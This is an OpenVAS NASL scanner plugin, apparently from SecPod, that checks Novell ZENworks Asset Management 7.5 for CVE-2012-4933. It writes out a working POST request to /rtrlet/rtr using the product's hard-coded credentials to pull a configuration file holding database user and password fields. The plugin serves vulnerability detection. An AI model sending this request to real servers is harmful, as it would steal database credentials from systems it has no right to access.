###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_novell_zenworks_asset_mangment_info_disc_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Novell ZENWorks Asset Management Information Disclosure Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to obtain sensitive
  information via a crafted rtrlet/rtr request for the HandleMaintenanceCalls
  function.
  Impact Level: Application";
tag_affected = "Novell ZENworks Asset Management version 7.5";
tag_insight = "The 'GetFile_Password()' and 'GetConfigInfo_Password()' method within the
  rtrlet component contains hard coded credentials and can be exploited to
  gain access to the configuration file and download arbitrary files by
  specifying an absolute path.";
tag_solution = "No solution or patch is available as of 26th October, 2012. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.novell.com/products/zenworks/assetmanagement/";
tag_summary = "This host is running Novell ZENWorks Asset Management and is prone
  to information disclosure vulnerabilities.";

if(description)
{
  script_id(902928);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-4933");
  script_bugtraq_id(55933);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-26 12:25:31 +0530 (Fri, 26 Oct 2012)");
  script_name("Novell ZENWorks Asset Management Information Disclosure Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50967/");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1027682");
  script_xref(name : "URL" , value : "http://www.osvdb.org/show/osvdb/86410");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/332412");
  script_xref(name : "URL" , value : "https://community.rapid7.com/community/metasploit/blog/2012/10/15/cve-2012-4933-novell-zenworks");

  script_description(desc);
  script_summary("Check if it is possible to read Asset Management configuration file");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


## Variable Initiliazation
port = "";
host = "";
req = "";
res = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Exit if host IP is not found
host = get_host_ip();
if(!host){
  exit(0);
}

## Construct the POST data
data = "kb=&file=&absolute=&maintenance=GetConfigInfo_password&username" +
       "=Ivanhoe&password=Scott&send=Submit";

## Construct the POST request
req = string("POST /rtrlet/rtr HTTP/1.1\r\n",
             "Host: ", host, ":", port, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n",
             data);

## Send constructed POST request and collect the response
res = http_keepalive_send_recv(port:port, data:req);

## Confirm that configure file contents is received
if(res && "Rtrlet Servlet Configuration Parameters" >< res &&
   "DBName" >< res && "DBUser" >< res && "ZENWorks" >< res &&
   "DBPassword" >< res){
 security_hole(0);
}
